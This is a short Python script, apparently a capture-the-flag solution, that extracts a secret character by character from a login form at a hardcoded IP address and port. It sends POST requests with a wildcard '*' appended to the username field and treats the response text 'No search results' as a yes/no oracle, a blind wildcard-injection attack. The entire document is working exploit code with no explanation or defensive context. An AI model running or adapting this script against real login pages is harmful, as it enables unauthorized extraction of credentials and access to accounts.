import requests
import string

lis = []

digits = string.printable

for i in digits:
    lis.append(i)

print(lis)

# BRUTE FORCE

url = "http://134.209.23.209:32612/login"

params = {'username': 'someval', 'password': '*'}

password = ''

triger = 1

while triger == 1:
    triger = 0
    for letter in lis:
        params['username'] = password + letter + '*'
        r = requests.post(url=url, data=params)
        if ('No search results' in r.text):
            password += letter
            triger = 1
            print('letter is : ',password)
            break
print('complete')
